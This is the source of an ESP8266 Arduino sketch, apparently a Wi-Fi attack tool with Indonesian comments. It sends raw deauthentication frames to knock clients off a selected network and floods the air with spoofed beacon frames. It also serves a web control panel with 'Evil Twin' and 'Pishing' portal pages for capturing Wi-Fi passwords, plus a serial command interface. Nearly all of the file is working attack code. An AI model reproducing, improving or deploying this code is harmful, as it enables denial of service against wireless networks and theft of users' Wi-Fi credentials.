#include <Arduino.h>
#include <ESP8266WiFi.h> // Tambahan wajib buat ESP8266
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <SimpleCLI.h>
#include "LittleFS.h"

// ========================================================
// 1. DEKLARASI VARIABEL GLOBAL (Wajib di Atas)
// ========================================================
uint8_t macAddr[6];
uint8_t wifi_channel = 1;
uint32_t currentTime = 0;
uint32_t packetSize = 109;
uint32_t packetCounter = 0;
uint32_t attackTime = 0;
uint8_t channelIndex = 0;
char emptySSID[32];
bool beacon_active = false;
int packet_rate = 0; 
uint8_t beaconPacket[109] = {
  0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 
  0x05, 0x06, 0x00, 0x00, 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 
  0x00, 0x00, 0xe8, 0x03, 0x31, 0x00, 0x00, 0x20, 0x20, 0x20, 
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
  0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 
  0x03, 0x01, 0x01, 0x30, 0x18, 0x01, 0x00, 0x00, 0x0f, 0xac, 
  0x02, 0x02, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 
  0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00
};

// ========================================================
// 2. INCLUDE CUSTOM HEADERS
// ========================================================
#include "web.h"
#include "beacon.h"
#include "sniffer.h"

// ========================================================
// 3. VARIABEL LOGIKA APLIKASI (KODE ASLI LU)
// ========================================================
#define MAC "C8:C9:A3:0C:5F:3F"
#define MAC2 "C8:C9:A3:6B:36:74"
bool lock = true;
SimpleCLI cli;
Command send_deauth, stop_deauth, reboot, start_deauth_mon, start_probe_mon;

int packet_deauth_counter = 0;
const char* fsName = "LittleFS";
FS* fileSystem = &LittleFS; // Biar "fileSystem->" di kode lu gak error

String fileList = "";
File fsUploadFile, webportal, log_captive;
String status_button;
String start_button = "Start";
int target_count = 0, target_mark = 0;

const uint8_t channels[] = {1, 6, 11};
const bool wpa2 = true;
const bool appendSpaces = false;
char ssids[500];
String wifistr = "";

extern "C" {
#include "user_interface.h"
  typedef void (*freedom_outside_cb_t)(uint8 status);
  int wifi_register_send_pkt_freedom_cb(freedom_outside_cb_t cb);
  void wifi_unregister_send_pkt_freedom_cb(void);
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

int ledstatus = 0;
bool hotspot_active = false, deauthing_active = false, pishing_active = false, hidden_target = false, deauth_mon = false;
unsigned long d_mon_ = 0, previousMillis = 0, deauth_now = 0, currentTimeLoop = 0;
int ledState = LOW, ledState2 = LOW; 
const long interval = 1000;

typedef struct {
  String ssid; uint8_t ch; uint8_t rssi; uint8_t bssid[6]; String bssid_str;
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP, dnsip;
DNSServer dnsServer;
_Network _networks[16], _selectedNetwork;
String ssid_target = "", mac_target = "", _correct = "", _tryPassword = "";

// ========================================================
// 4. FUNGSI HELPER & FILESYSTEM
// ========================================================
String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += "0";
    str += String(b[i], HEX);
    if (i < size - 1) str += ":";
  }
  return str;
}

void clearArray() { for (int i = 0; i < 16; i++) { _Network _n; _networks[i] = _n; } }

void handleList(){
  fileList = "";
  Dir dir = fileSystem->openDir("");
  while (dir.next()) {
    fileList += "<form style='text-align: left;margin-left: 5px;' action='/delete' method='post'><input type='submit' value='delete'><input name='filename' type='hidden' value='" + dir.fileName() +"'> ";
    fileList += dir.fileName();
    fileList += String(" (") + dir.fileSize()/1000 + "kb)</form><br>";
  }
}

void handleFS(){
  handleList();
  FSInfo fs_info;
  fileSystem->info(fs_info);
  total_spiffs = fs_info.totalBytes/1000;
  used_spiffs = fs_info.usedBytes/1000;
  free_spiffs = total_spiffs - used_spiffs;
  
  static const char FS_html[] PROGMEM = R"=====(
  <div class='card'><p class='card-title'>-File manager-</p><p Style='text-align: center';><form method='post' enctype='multipart/form-data'><input type='file' name='name'><input class='button' type='submit' value='Upload'></form><br>
  <table><tr><th>Total : {total_spiffs} kb</th></tr><br>
  <tr><th>Used : {used_spiffs} kb</th></tr><br>
  <tr><th>Free : {free_spiffs} kb</th></tr></table><br>
  <br></p>
  <label style='text-align: left;margin-left: 5px;' for='list'>File List : <br> {fileList}</label></div>
  <div class='card'><p class='card-title'>-Web-</p><p Style='text-align: center';> <form action='/websetting' method='POST'> <label for='path'><a href='/eviltwinprev' target='_blank'>Evil Twin</a></label><input type='text' name='evilpath' value='{eviltwinpath}'><br>
  <label for='path'><a href='/pishingprev' target='_blank'>Pishing </a></label><input type='text' name='pishingpath' value='{pishingpath}'><br>
  <label for='path'><a href='/loadingprev' target='_blank'>Loading </a></label><input type='text' name='loadingpath' value='{loadingpath}'>
  <input style='width: 80px;height: 45px;' type ='submit' value ='Save'></form><br></p></div>)=====";

  String fshtml = FPSTR(FS_html);
  fshtml.replace("{fileList}",fileList);
  fshtml.replace("{total_spiffs}", String(total_spiffs));
  fshtml.replace("{used_spiffs}",String(used_spiffs));
  fshtml.replace("{free_spiffs}",String(free_spiffs));
  fshtml.replace("{eviltwinpath}",String(eviltwinpath));
  fshtml.replace("{pishingpath}",String(pishingpath));
  fshtml.replace("{loadingpath}",String(loadingpath));
  webServer.send(200,"text/html",Header + fshtml + Footer);
}

void handleFileUpload(){
  HTTPUpload& upload = webServer.upload();
  if(upload.status == UPLOAD_FILE_START){
    String filename = upload.filename;
    if(!filename.startsWith("/")) filename = "/"+filename;
    fsUploadFile = fileSystem->open(filename, "w");
  } else if(upload.status == UPLOAD_FILE_WRITE){
    if(fsUploadFile) fsUploadFile.write(upload.buf, upload.currentSize);
  } else if(upload.status == UPLOAD_FILE_END){
    if(fsUploadFile) { fsUploadFile.close(); handleFS(); }
  }
}

// ==================== [ FUNGSI ATTACK & BEACON ] ====================
void nextChannel() {
  if (sizeof(channels) > 1) {
    uint8_t ch = channels[channelIndex];
    channelIndex = (channelIndex + 1) % sizeof(channels);
    if (ch != wifi_channel) { wifi_channel = ch; wifi_set_channel(wifi_channel); }
  }
}

void randomMac() { for (int i = 0; i < 6; i++) macAddr[i] = random(256); }

void enableBeacon(String target_ssid){
  wifistr = "";
  for(int i=0; i<beacon_size; i++){
    wifistr += target_ssid;
    for(int c=0; c<i; c++) wifistr += " ";
    wifistr += "\n";
  }
  wifistr.toCharArray(ssids, 500);
  for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
  randomSeed(os_random());
  packetSize = sizeof(beaconPacket);
  beaconPacket[34] = wpa2 ? 0x31 : 0x21;
  randomMac();
  beacon_active = true;
}

void handleStartAttack(){
  int deauth = webServer.arg("deauth").toInt();
  int evil = webServer.arg("evil").toInt();
  int rogue = webServer.arg("rogue").toInt();
  int beacon = webServer.arg("beacon").toInt();
  
  if(start_button == "Start"){
    start_button = "Stop";
    if(beacon == 1) { beacon_active = true; enableBeacon(ssid_target); }
    if(deauth == 1) deauthing_active = true;
    if(evil == 1 || rogue == 1) {
       hotspot_active = true;
       // Logic restart AP ke target SSID lu...
    }
  } else {
    start_button = "Start";
    deauthing_active = false; beacon_active = false; hotspot_active = false;
  }
  handleIndex();
}

// ==================== [ SETUP & LOOP ] ====================
void setup() {
  Serial.begin(115200);
  initFS(); loadsetting();
  apIP.fromString(ip); dnsip.fromString(dns);
  
  WiFi.softAP(ssid, password, chnl, false);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  
  pinMode(2, OUTPUT); pinMode(16, OUTPUT); pinMode(4, OUTPUT); pinMode(0, INPUT_PULLUP);
  
  webServer.on("/", HTTP_GET, handleIndex);
  webServer.on("/scan", HTTP_GET, [](){ performScan(); handleIndex(); });
  webServer.on("/start", HTTP_GET, handleStartAttack);
  webServer.on("/filemanager", HTTP_GET, handleFS);
  webServer.on("/filemanager", HTTP_POST, [](){ webServer.send(200); }, handleFileUpload);
  webServer.on("/delete", [](){
      String names = "/" + webServer.arg("filename");
      fileSystem->remove(names);
      handleFS();
  });
  
  webServer.begin();
  
  send_deauth = cli.addCmd("send_deauth");
  stop_deauth = cli.addCmd("stop_deauth");
  reboot = cli.addCmd("reboot");
  start_deauth_mon = cli.addCmd("start_deauth_mon");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (Serial.available()) {
    String input = Serial.readStringUntil('\n');
    cli.parse(input);
  }

  if (cli.available()) {
    Command cmd = cli.getCmd();
    if (cmd == send_deauth) deauthing_active = true;
    else if (cmd == stop_deauth) deauthing_active = false;
    else if (cmd == reboot) ESP.restart();
  }

  // Blinking LED logic
  unsigned long currentMillis = millis();
  if (currentMillis - previousMillis >= 100) {
    previousMillis = currentMillis;
    ledState = !ledState;
    digitalWrite(16, ledState);
  }

  // Deauth Execution
  if (deauthing_active && millis() - deauth_now >= deauth_speed) {
    deauth_now = millis();
    wifi_set_channel(_selectedNetwork.ch);
    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    for(int i=0; i<5; i++) wifi_send_pkt_freedom(deauthPacket, 26, 0);
  }

  // Beacon Flood Execution
  if (beacon_active && millis() - attackTime > 100) {
    attackTime = millis();
    nextChannel();
    int i = 0, ssidNum = 1;
    int ssidsLen = strlen(ssids);
    while (i < ssidsLen) {
      int j = 0;
      while (ssids[i+j] != '\n' && j < 32 && (i+j) < ssidsLen) j++;
      uint8_t ssidLen = j;
      macAddr[5] = ssidNum++;
      memcpy(&beaconPacket[10], macAddr, 6);
      memcpy(&beaconPacket[16], macAddr, 6);
      memset(&beaconPacket[38], 0x20, 32);
      memcpy(&beaconPacket[38], &ssids[i], ssidLen);
      beaconPacket[37] = ssidLen;
      beaconPacket[82] = wifi_channel;
      wifi_send_pkt_freedom(beaconPacket, packetSize, 0);
      i += (j + 1);
    }
  }
}
